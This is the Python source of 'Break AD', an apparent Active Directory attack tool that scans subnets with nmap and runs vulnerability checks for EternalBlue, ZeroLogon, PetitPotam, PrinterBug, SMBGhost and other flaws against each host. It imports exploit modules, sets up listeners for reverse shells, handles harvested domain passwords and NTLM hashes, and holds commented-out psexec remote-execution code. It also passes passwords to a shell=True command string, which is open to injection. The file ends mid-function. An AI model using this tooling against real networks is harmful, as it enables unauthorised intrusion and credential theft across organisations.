#!/usr/bin/env python3
''' Script to break ad (or not) '''
# Script made by Mizaru

############################################################################################################################
########## => IMPORT TOOLS & UTILITIES
############################################################################################################################
import os
import ipaddress
import subprocess
import time
import nmap
import pandas
from git.repo.base import Repo
import netifaces as ni
from neo4j import GraphDatabase

# SCANNERS IMPORT
import SCANNER.bluegate_cve20200610_scanner as bluegate_scanner
import SCANNER.eternalblue_ms17010_scanner as eternalblue_scanner
#import SCANNER.kerberoschecksum_ms14068_scanner as kerberoschecksum_scanner # not correctly implemented for now
import SCANNER.micRA_cve20191040_scanner as micra_scanner
import SCANNER.printnightmare_cve20211675_scanner as printnightmare_scanner
import SCANNER.rpcdump_scanner as rpcdump_scanner
import SCANNER.smbsigning_scanner as smbsigning_scanner
import SCANNER.sAMAccountName_cve202142278_scanner as samaccountspoof_scanner
import SCANNER.smbghost_cve20200796_scanner as smbghost_scanner
import SCANNER.smbleed_cve20201206_scanner as smbleed_scanner
import SCANNER.zerologon_cve20201472_scanner as zerologon_scanner
import SCANNER.petitpotam_scanner as petitpotam_scanner
import SCANNER.getgppcreds_scanner as gppabuse_scanner
import SCANNER.netapi_cve20084250_scanner as netapi_scanner

# SCANNER-AD
import SCANNER_AD.get_hostname as get_hostname

# POC IMPORT
import POC.bluegate_cve20200610_poc as bluegate_poc
import POC.netapi_cve20084250_poc as netapi_poc
import POC.eternalblue_ms17010_poc as eternalblue_poc
import POC.printnightmare_cve20211675_poc as printnightmare_poc
import POC.zerologon_cve20201472_poc as zerologon_poc
import POC.sAMAccountName_cve202142278_poc as samaccountname_poc
import POC.smbghost_cve20200796_poc as smbghost_poc
import POC.petitpotam_poc as petitpotam_poc
from SCANNER.getgppcreds_scanner import getgpp_creds as getgpp_poc

def download_utilities():
    '''To download the utilities for the BREAKADAY TOOL'''
    print(f"{bcolors.OKGREEN}\nEntering into [DOWNLOAD UTILITIES] menu...{bcolors.ENDC}")
    os.chdir(f"{cwd}/SCANNER_AD")
    if not os.path.exists(f"{cwd}/SCANNER_AD/Responder"):
        Repo.clone_from("https://github.com/lgandx/Responder", f"{cwd}/SCANNER_AD/Responder")
    # to do: install pip3 impacket via their repo (ex: git clone + cd dir + pip3 install .)
    print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")

############################################################################################################################
########## => FUNCTIONS, VARIABLES, ETC. PER DEFAULT
############################################################################################################################

cwd = os.getcwd()


class bcolors:
    '''Different colors for print functions'''
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def get_int_val(sub_val, up_val):
    '''Retrieve an integer between two values'''
    while True:
        try:
            # val = int(input("Enter the value (or 'Exit' to quit): "))
            val = int(input("Enter the value: "))
            if sub_val <= val <= up_val:
                return val
            else:
                print(f"The value must be between {sub_val} and {up_val}.")
            # val = input("Enter the value (or 'Exit' to quit): ")
            # if sub_val <= int(val) <= up_val:
            #     return int(val)
            # if val == "Exit":
            #     break
        except ValueError:
            print(f"The value must be an integer between {sub_val} and {up_val}.")



def get_ip_addrs():
    '''To return the list of available interfaces.'''
    interfaces = ni.interfaces()
    addrs = [ni.ifaddresses(interface)[ni.AF_INET][0]['addr'] for interface in interfaces if '2: [{' in str(ni.ifaddresses(interface))]
    return addrs

def get_interface():
    '''To return an interface name among your available interfaces.'''
    print(f"{bcolors.OKBLUE}Select a network interface for listening on... {bcolors.ENDC}")
    interfaces = ni.interfaces()
    interfaces_menu_options = {}
    for index, interface in enumerate(interfaces):
        interfaces_menu_options[index] = interface
    option_numero = print_menu(interfaces_menu_options)
    return interfaces_menu_options[option_numero]


def get_listening_ip():
    '''To return a listening IP among your INET IP.'''
    print(f"{bcolors.OKBLUE}Select an IP for listening on... {bcolors.ENDC}")
    addrs = get_ip_addrs()
    ip_addrs_menu_options = {}
    for index, addr in enumerate(addrs):
        ip_addrs_menu_options[index] = addr
    option_numero = print_menu(ip_addrs_menu_options)
    ip_addr = ip_addrs_menu_options[option_numero]
    return ip_addr

def get_listening_addr():
    '''To return a listening IP and listening port (mainly for reverse shell).'''
    ip_addr = get_listening_ip()
    lport = get_int_val(0, 65535)
    return ip_addr, lport

############################################################################################################################
########## => THE MENUS
############################################################################################################################

def print_menu(menu_options):
    '''Choose among different options from a menu:
        example of menu:
        scan_vuln_menu_options =  {
            1: "Option 01: Searching for IP vulnerable to Eternal Blue (or MS17-010) attack",
            2: "Option 02: Searching for IP vulnerable to PrintNightmare attack",
            }
    '''
    print(f"\n{bcolors.UNDERLINE}=> Menu{bcolors.ENDC}")
    for key in menu_options.keys():
        print(f"[{key}] {menu_options[key]}")
    print("Choose among the different options...")
    option_numero = get_int_val(0, len(menu_options))
    return option_numero


############################################################################################################################
########## => PLAY WITH SHARES
############################################################################################################################
# NOT CORRECTLY IMPLEMENTED FOR NOW
# THE GOAL WOULD BE TO DOWNLOAD .ps1 (currently working on a script) that check all potential vulnerabilities without being detected 
"""
import smbclient
from pypsexec.client import Client

def copy_localfile(username, password, filename, machine_name, path_on_remote_machine='\\c$\\tmp'):
    smbclient.shutil.copyfile(filename, f'\\\\{machine_name}\\c$\\tmp', username=username, password=password)

def copy_remotefile(username, password, filename, machine_name, path_on_remote_machine='\\c$\\Downloads'):
    smbclient.shutil.copyfile(f'\\\\{machine_name}\\c$\\tmp\\results.txt', filename, username=username, password=password)

def connect_psexec(domain_name, hostname, username, password):


    # creates an encrypted connection to the host with the username and password
    c = Client(hostname, username=username, password=password)

    # set encrypt=False for Windows 7, Server 2008
    c = Client(hostname, username=username, password=password, encrypt=False)

    # if Kerberos is available, this will use the default credentials in the
    # credential cache
    c = Client(hostname)

    # you can also tell it to use a specific Kerberos principal in the cache
    # without a password
    c = Client(hostname, username=f"{username}@{domain_name}")

    c.connect()
    return c

# Links: https://github.com/jborean93/pypsexec
def execute_psexecpy(c, username, password, command, arguments, run_elevated=False):
    try:
        c.create_service()

        # After creating the service, you can run multiple exe's without
        # reconnecting

        # run a simple cmd.exe program with arguments
        stdout, stderr, rc = c.run_executable(command, 
                                            arguments=arguments,
                                            username=username,
                                            password=password,
                                            run_elevated=run_elevated
                                                )
        stdout, stderr, rc = c.run_executable("cmd.exe",
                                            arguments="/c echo Hello World")
    finally:
        c.remove_service()
        c.disconnect()
"""
############################################################################################################################
########## => SECTION BLOODHOUND
############################################################################################################################
class ImportNeo4j:
    '''Neo4j class to play with AD data'''
    def __init__(self, uri, user, password):
        self.driver = GraphDatabase.driver(uri, auth=(user, password))

    # to add/ to do : create shortestPath from isVulnerableToX=True allowing to create new compromission paths (examples: these from BloodHound)

    def import_vulns_computers(self, filename, name_attribute):
        print(f"{bcolors.WARNING}Setting data for {name_attribute} into BloodHound/Neo4J...{bcolors.ENDC}")
        df_computers = pandas.read_csv(f"{cwd}/known-data/accounts/computers_list.csv") if os.path.isfile(f"{cwd}/known-data/accounts/computers_list.csv") else pandas.DataFrame()
        df = pandas.read_csv(filename, header=None) if os.path.isfile(filename) else pandas.DataFrame()
        for index, row in df.iterrows():
            row_with_vals = df_computers.loc[df_computers[' IP'] == str(row[0])]
            if not row_with_vals.empty:
                for index2, row_with_ip in row_with_vals.iterrows():
                    print(f"{bcolors.WARNING}   [*] For {row_with_ip[' dNSHostName']} at IP = {df[0][index]}{bcolors.ENDC}")
                    query = f"MATCH (c) \
                        WHERE toUpper(c.distinguishedname) CONTAINS 'CN={row_with_ip['cn'].upper()}' \
                        SET c.{name_attribute}_p{df[1][index]}='{df[2][index]}', c.IP='{df[0][index]}' \
                        RETURN c"
                    with self.driver.session() as session:
                        with session.begin_transaction() as tx:
                            tx.run(query)

def setting_bloodhound_data():
    print(f"{bcolors.OKGREEN}\nEntering into [NEO4J/BLOODHOUND] menu...{bcolors.ENDC}")
    neo4j_username = input("What is your neo4j username?\nEnter the username: ")
    neo4j_password = input("What is your neo4j password?\nEnter the password: ")
    neo4j_port = input("What is the port used by Neo4j (per default: 7687)?\nEnter the port: ")
    neo4j_db = ImportNeo4j(f"bolt://localhost:{neo4j_port}", neo4j_username, neo4j_password)
    try:
        with neo4j_db.driver.session() as session:
            with session.begin_transaction() as tx:
                tx.run("MATCH () RETURN 1 LIMIT 1")
    except Exception:
        print(f"{bcolors.FAIL}Your Neo4j database is not currently running.{bcolors.ENDC}")
        print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
        return

    print(f"{bcolors.FAIL}You must have a file (called computers_list.csv in known-data/accounts) with the format: IP, hostname of the targets to set data into BloodHound{bcolors.ENDC}")
    print(f"{bcolors.FAIL}For this, choose a valid domain user, domain, and a domain controller to query for the hostnames...{bcolors.ENDC}")
    df = pandas.read_csv(f"{cwd}/known-data/accounts/dom-users_list.txt",)
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following accounts: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        domain_name = df.loc[row_chosen, 'domain']
        username = df.loc[row_chosen, 'username']
        password = df.loc[row_chosen, 'password']
        ntlm_hash = df.loc[row_chosen, 'NTLM_hash']
        print(f"{bcolors.HEADER}The chosen user : {df.loc[row_chosen, 'domain']}/{df.loc[row_chosen, 'username']} (password: {df.loc[row_chosen, 'password']}, hash: {df.loc[row_chosen, 'NTLM_hash']}).{bcolors.ENDC}")
    else:
        print(f"{bcolors.FAIL}There are no domain users...\n{bcolors.ENDC}")
        print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
        return

    df = pandas.read_csv(f"{cwd}/known-data/accounts/domain-infos_list.txt")
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following domains: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        fqdn = df.loc[row_chosen, 'fqdn']
        domain_name = df.loc[row_chosen, 'domain']
        tld = df.loc[row_chosen, 'tld']
        print(f"{bcolors.HEADER}The chosen domain : {df.loc[row_chosen, 'domain']} (fqdn: {df.loc[row_chosen, 'fqdn']}, tld: {df.loc[row_chosen, 'tld']}).{bcolors.ENDC}")
    else:
        print("You should run the option 1 to get the domain name or write it into the file: domain-infos_list.txt.")
        print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
        return

    df = pandas.read_csv(f"{cwd}/known-data/accounts/domain-controllers_list.txt")
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following domains controllers: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        dc_name = df.loc[row_chosen, 'domain_controller_hostname']
        dc_ip = df.loc[row_chosen, 'domain_controller_ip']
        print(f"{bcolors.HEADER}The chosen domain controller: {df.loc[row_chosen, 'domain_controller_hostname']} (ip: {df.loc[row_chosen, 'domain_controller_ip']}).{bcolors.ENDC}")
    else:
        print("You should run the option 1 to retrieve the domain controllers or write it into the file: domain-controllers_list.txt.")
        print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
        return
    os.chdir(f"{cwd}/known-data/accounts")
    try:
        bashCommand = f"python3 {cwd}/SCANNER_AD/windapsearch.py --dc-ip {dc_ip} -u {username}@{fqdn} -p {password} --computers -r -C -o {cwd}/known-data/accounts/results_ldap"
        subprocess.run(bashCommand, shell=True, check=False)
    except Exception:
        print(f"{bcolors.WARNING}An error occured when launching windapsearch...{bcolors.ENDC}")
    if os.path.isfile(f"{cwd}/known-data/accounts/results_ldap/computers_list.csv"):
        df = pandas.read_csv(f"{cwd}/known-data/accounts/results_ldap/computers_list.csv", sep=",")
        if len(df) > 0:    
            with open(f"{cwd}/known-data/accounts/computers_list.csv", "a+", encoding="utf-8") as output:
                for index, computer in df.iterrows():
                    output.seek(0)
                    if computer['cn'] in output.read() or computer[' IP'] is None:
                        continue
                    output.write(f"{computer['cn']},{computer[' dNSHostName']},{computer[' IP']}")
                output.close()

    if os.path.isfile(f"{cwd}/known-data/accounts/computers_list.csv"):
        df = pandas.read_csv(f"{cwd}/known-data/accounts/computers_list.csv",)
        if len(df) <= 0:
            print(f"{bcolors.FAIL}A problem must have occured during the requesting of computers list (such as no IP retrieved), you should re-run the scan or write the computers list into known-data/accounts/computers_list.csv...{bcolors.ENDC}")
            os.remove(f"{cwd}/known-data/accounts/computers_list.csv")
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return

        print(f"{bcolors.WARNING}IMPORTING VULNERABILITIES DATA INTO BLOODHOUND/NEO4J...{bcolors.ENDC}")
        # Import SMBGhost
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/cve-smbghost_vulns-ip", "isVulnerableToSMBGhost")
        # Import SMBleed
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/cve-smbleed_vulns-ip", "isVulnerableToSMBleed")
        # Import Eternal Blue w/o account
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip", "isVulnerableToEternalBlue")
        # Import Eternal Blue
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/ms17-010-eternalblue_vulns-ip", "isVulnerableToEternalBlue")
        # Import NetApi
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/ms08-67_vulns-ip", "isVulnerableToNetapi")
        # Import SMB Signing
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/smb_signing_disabled", "isSMBSigningEnabled")
        # Import PetitPotam with null session
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/petitpotam-nullsession_vulns-ip", "isVulnerableToNSPetitPotam")
        # Import PetitPotam
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/petitpotam_vulns-ip", "isVulnerableToPetitPotam")
        # Import PrinterBug
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/printerbug_vulns-ip", "isVulnerableToPrinterBug")
        # Import Kerberos Checksum
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/ms14-068-kerberos_vulns-ip", "isVulnerableToKerberosChecksum")
        # Import ZeroLogon
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/cve-zerologon_vulns-ip", "isVulnerableToZeroLogon")
        # Import GPP Abuse without acount
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/gppabuse-wa_vulns-ip", "isVulnerableToNSGPPAbuse")
        # Import GPP Abuse
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/gppabuse_vulns-ip", "isVulnerableToGPPAbuse")
        # Import BlueGate
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/cve-bluegate_vulns-ip", "isVulnerableToBlueGate")
        # Import PrintNightmare
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/cve-printnightmare_vulns-ip", "isVulnerableToPrintNightmare")
        # Import MIC Remove attack
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/micRA_vulns-ip", "isVulnerableToMICRemove")
        # Import sAMAccountNAme Spoofing
        neo4j_db.import_vulns_computers(f"{cwd}/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip", "isVulnerableToSAMAccountNameSpoofing")


############################################################################################################################
########## => SCANNING NETWORK
############################################################################################################################

def scanning_network():
    print('''The network will be scanned to get the IPs with the following opened ports:\n \
        - RPC ports: 135, 593\n \
        - SMB ports: 139, 445\n \
        - RDG ports: 3391 (on UDP)\n \
        - Domain name \n \
        - Domain controllers (IP and hostname)" \
    ''')
    list_ranges = [filename.split("_")[1] for filename in os.listdir(f"{cwd}/known-data/network")]
    set_ranges = set(list_ranges)
    list_ranges = list(set_ranges)
    network_ip = ''
    if set_ranges:
        print(f"{bcolors.OKGREEN}You already scanned the following ranges:{bcolors.ENDC}\n \
{list_ranges}\n \
Do you want to choose among them (yes) or scan a new range (no)?")
        answer = input("Enter your answer (yes/no): ")
        if answer.lower() == "yes":
            menu_ranges = {}
            # for i in range(0, len(list_ranges)):
            for index, val in enumerate(list_ranges):
                menu_ranges[index] = val
            option_numero = print_menu(menu_ranges)
            network_ip, subnet = list_ranges[option_numero].split("-")
    if not network_ip:
        print("What is the network range (IP-subnet) to scan?")
        while True:
            try:
                network_ip = input("Please enter the ip address of the network to scan: ")
                network_ip = ipaddress.ip_address(network_ip)
                break
            except ValueError:
                print("Thats not a valid IP address.")
        print("What is its subnet?")
        subnet = get_int_val(0, 32)

    # SMB Ports
    print(f"{bcolors.OKGREEN}\nChecking opened ports for SMB on {network_ip}/{subnet}...{bcolors.ENDC}")
    if not os.path.isfile(f"{cwd}/known-data/network/open-microsoftDS-ip_{network_ip}-{subnet}"):
        nm = nmap.PortScanner()
        nm.scan(hosts=f"{network_ip}/{subnet}", ports="139,445", arguments="-R -Pn --open").get('scan')
        with open(f"{cwd}/known-data/network/open-microsoftDS-ip_{network_ip}-{subnet}", "w", encoding="utf-8") as output:
            output.write(nm.csv())
            output.close()
    else:
        print(f"{bcolors.FAIL}The range {network_ip}/{subnet} on SMB ports has already been scanned...{bcolors.ENDC}")
        print("Do you want to re-analyze it?")
        answer = input("Enter your answer (yes/no): ")
        if answer.lower() == "yes":
            nm = nmap.PortScanner()
            nm.scan(hosts=f"{network_ip}/{subnet}", ports="139,445", arguments="-R -Pn --open").get('scan')
            with open(f"{cwd}/known-data/network/open-microsoftDS-ip_{network_ip}-{subnet}", "w", encoding="utf-8") as output:
                output.write(nm.csv())
                output.close()

    # RPC Ports
    print(f"{bcolors.OKGREEN}\nChecking opened ports for RPC on {network_ip}/{subnet}...{bcolors.ENDC}")
    if not os.path.isfile(f"{cwd}/known-data/network/open-RPC-ip_{network_ip}-{subnet}"):
        nm = nmap.PortScanner()
        nm.scan(f"{network_ip}/{subnet}", arguments="-p135,593 -R -Pn --open")
        with open(f"{cwd}/known-data/network/open-RPC-ip_{network_ip}-{subnet}", "w", encoding="utf-8") as output:
            output.write(nm.csv())
            output.close()
    else:
        print(f"{bcolors.FAIL}The range {network_ip}/{subnet} on RPC ports has already been scanned...{bcolors.ENDC}")
        print("Do you want to re-analyze it?")
        answer = input("Enter your answer (yes/no): ")
        if answer.lower() == "yes":
            nm = nmap.PortScanner()
            nm.scan(f"{network_ip}/{subnet}", arguments="-p135,593 -R -Pn --open")
            with open(f"{cwd}/known-data/network/open-RPC-ip_{network_ip}-{subnet}", "w", encoding="utf-8") as output:
                output.write(nm.csv())
            output.close()

    # RDG Ports
    print(f"{bcolors.OKGREEN}\nChecking opened ports for RDG on {network_ip}/{subnet}...{bcolors.ENDC}")
    if not os.path.isfile(f"{cwd}/known-data/network/open-RDG-ip_{network_ip}-{subnet}"):
        nm = nmap.PortScanner()
        nm.scan(f"{network_ip}/{subnet}", arguments="-p3391 -R -Pn --open")
        with open(f"{cwd}/known-data/network/open-RDG-ip_{network_ip}-{subnet}", "w", encoding="utf-8") as output:
            output.write(nm.csv())
            output.close()
    else:
        print(f"{bcolors.FAIL}The range {network_ip}/{subnet} on RDG ports has already been scanned...{bcolors.ENDC}")
        print("Do you want to re-analyze it?")
        answer = input("Enter your answer (yes/no): ")
        if answer.lower() == "yes":
            nm = nmap.PortScanner()
            nm.scan(f"{network_ip}/{subnet}", arguments="-p3391 -R -Pn --open")
            with open(f"{cwd}/known-data/network/open-RDG-ip_{network_ip}-{subnet}", "w", encoding="utf-8") as output:
                output.write(nm.csv())
                output.close()

    # Domain name & domain controllers
    print(f"{bcolors.OKGREEN}\nChecking domain name & domain controllers infos on {network_ip}/{subnet}...{bcolors.ENDC}")
    nm = nmap.PortScanner()
    nm.scan(f"{network_ip}/{subnet}", arguments="-p389 -sV -Pn")
    nmap_csv = nm.csv()
    list_dcs = [line.split(";")[0] for line in nmap_csv.splitlines() if "Microsoft Windows Active Directory LDAP" in line]
    domains_name = [line.split(";")[8].split(":")[1].split(",")[0].strip() for line in nmap_csv.splitlines() if "Microsoft Windows Active Directory LDAP" in line]
    with open(f"{cwd}/known-data/accounts/domain-controllers_list.txt", "a+", encoding="utf-8") as output:
        for dc_ip in list_dcs:
            if os.path.isfile(f"{cwd}/known-data/accounts/domain-controllers_list.txt"):
                output.seek(0)
                if dc_ip in output.read():
                    continue
            output.write(f"\n,{dc_ip}\n")
        output.close()

    with open(f"{cwd}/known-data/accounts/domain-infos_list.txt", "a+", encoding="utf-8") as output:
        for domain_name in domains_name:
            if os.path.isfile(f"{cwd}/known-data/accounts/domain-infos_list.txt"):
                output.seek(0)
                if domain_name in output.read():
                    continue
            output.write(f"\n{domain_name},{domain_name.split('.')[0]},{domain_name.split('.')[-1]}")
        output.close()
    print(f"{bcolors.OKBLUE}=> The files are saved into known-data/network{bcolors.ENDC}")
    print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")

############################################################################################################################
########## => SEARCHING/EXPLOITING VULNS
############################################################################################################################

def scanning_vulns_without_account():
    '''searching known vulns without any accounts'''
    print(f"{bcolors.OKGREEN}\nEntering into [SEARCHING VULNERABILITIES WITHOUT ACCOUNT] menu...{bcolors.ENDC}")
    print(f"{bcolors.BOLD}The known attacks are:{bcolors.ENDC}")
    print(f"{bcolors.OKBLUE}=> ZeroLogon, SMBGhost, SMBleed, BlueGate, MS14-068, MS08-67, SMB Signing{bcolors.ENDC}")
    scan_vuln_menu_options =  {
        1: "Option 01: Searching for IP vulnerable to SMBGhost attack",
        2: "Option 02: Searching for IP vulnerable to SMBleed attack",
        3: "Option 03: Searching for IP vulnerable to MS17-010 attack",
        4: "Option 04: Searching for IP vulnerable to MS08-067 attack",
        5: "Option 05: Searching for IP vulnerable to PetitPotam with null session attack",
        6: "Option 06: Searching for IP vulnerable to SMB Signing defect",
        7: "Option 07: Searching for IP vulnerable to PrinterBug (or SpoolSample) attack",
        8: "Option 08: Searching for IP vulnerable to MS14-068 (Kerberos Checksum attack) attack",
        9: "Option 09: Searching for IP vulnerable to ZeroLogon attack",
        10: "Option 10: Searching for IP vulnerable to GPP abuse attack",
        11: "Option 11: Searching for IP vulnerable to BlueGate attack",
        12: "Option 12: Return to the main menu"
    }
    df = pandas.read_csv(f"{cwd}/known-data/accounts/domain-infos_list.txt")
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following domains: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        fqdn = df.loc[row_chosen, 'fqdn']
        domain_name = df.loc[row_chosen, 'domain']
        tld = df.loc[row_chosen, 'tld']
        print(f"{bcolors.HEADER}The chosen domain : {df.loc[row_chosen, 'domain']} (fqdn: {df.loc[row_chosen, 'fqdn']}, tld: {df.loc[row_chosen, 'tld']}).{bcolors.ENDC}")
    else:
        print("You should run the option 1 to get the domain name or write it into the file: domain-infos_list.txt.")
        return

    while True:
        option_numero = print_menu(scan_vuln_menu_options)
        # ATTACKING SMB PORTS : 445
        files_microsoftDS = [filename for filename in os.listdir(f"{cwd}/known-data/network") if filename.startswith("open-microsoftDS-ip_")]
        for file in files_microsoftDS:
            df_smb = pandas.read_csv(f"{cwd}/known-data/network/{file}", sep=";")
            for index, row in df_smb.iterrows():
                # Attack: SMBGhost (or CVE-2020-0796) with smbghost_cve20200796.py
                if option_numero == 1:
                    print(f"{bcolors.WARNING}Trying SMBGhost attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-smbghost_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-smbghost_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port'])).any():
                        results = smbghost_scanner.scanner(row['host'], row['port'])
                        if results:
                            file = open(f"{cwd}/known-data/vulns/cve-smbghost_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToSMBGhost']},{row['hostname']}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

                # Attack: SMBleed (or CVE-2020-1206) with smbleed_cve20201206_scanner.py
                elif option_numero == 2:
                    print(f"{bcolors.WARNING}Trying SMBleed attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-smbleed_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-smbleed_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port'])).any():
                        results = smbleed_scanner.scan(row['host'], row['port'])
                        if results:
                            file = open(f"{cwd}/known-data/vulns/cve-smbleed_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToSMBleed']}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

                # Attack: Eternal Blue (or MS17-010): with eternalblue_ms17010_scanner.py
                elif option_numero == 3:
                    print(f"{bcolors.WARNING}Trying Eternal Blue attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port'])).any():
                        results = eternalblue_scanner.scan(row['host'], row['port'])
                        if results:
                            file = open(f"{cwd}/known-data/vulns/ms17-010-eternalblue_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToEternalBlue']},{row['hostname']}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

                # Attack: Netapi (or MS08-067) with netapi_scanner.py
                elif option_numero == 4:
                    print(f"{bcolors.WARNING}Trying MS08-067 attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/ms08-67_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/ms08-67_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port'])).any():
                        results = netapi_scanner.scan(row['host'], row['port'])
                        if results:
                            file = open(f"{cwd}/known-data/vulns/ms08-67_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToNetapi']}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

                # Attack: NTLM Relayx / SMB Signing
                elif option_numero == 6:
                    print(f"{bcolors.WARNING}Checking SMB signing against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/smb_signing_disabled", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/smb_signing_disabled") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port'])).any():
                        results = smbsigning_scanner.scan(row['host'], row['port'])
                        if results:
                            file = open(f"{cwd}/known-data/vulns/smb_signing_disabled", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['isSMBSigningEnabled']}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

        # ATTACKING RPC PORTS : 135, 593
        files_RPC = [filename for filename in os.listdir(f"{cwd}/known-data/network") if filename.startswith("open-RPC-ip_")]
        for file in files_RPC:
            df_rpc = pandas.read_csv(f"{cwd}/known-data/network/{file}", sep=";")
            for index, row in df_rpc.iterrows():
                # Attack: PetitPotam with nullsession
                if option_numero == 5:
                    print(f"{bcolors.WARNING}Trying PetitPotam with nullsession attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/petitpotam-nullsession_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/petitpotam-nullsession_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port'])).any(): # add df[3] == username
                        results = petitpotam_scanner.scan('guest', '', domain_name, '', '', row['host'], row['host'], row['port'], pipe='lsarpc')
                        if results:
                            file = open(f"{cwd}/known-data/vulns/petitpotam-nullsession_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToPetitPotam']},guest\n")
                            file.close()
                        results = petitpotam_scanner.scan('', '', domain_name, '', '', row['host'], row['host'], row['port'], pipe='lsarpc')
                        if results:
                            file = open(f"{cwd}/known-data/vulns/petitpotam-nullsession_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToPetitPotam']},anonymous\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

                # Attack: PrinterBug (or SpoolSample)
                if option_numero == 7:
                    print(f"{bcolors.WARNING}Trying PrinterBug attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/printerbug_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/printerbug_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port'])).any():
                        results = rpcdump_scanner.scan('guest', '', domain_name, None, row['host'], row['port'])
                        if results:
                            file = open(f"{cwd}/known-data/vulns/printerbug_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToPrinterBug']},guest\n")
                            file.close()
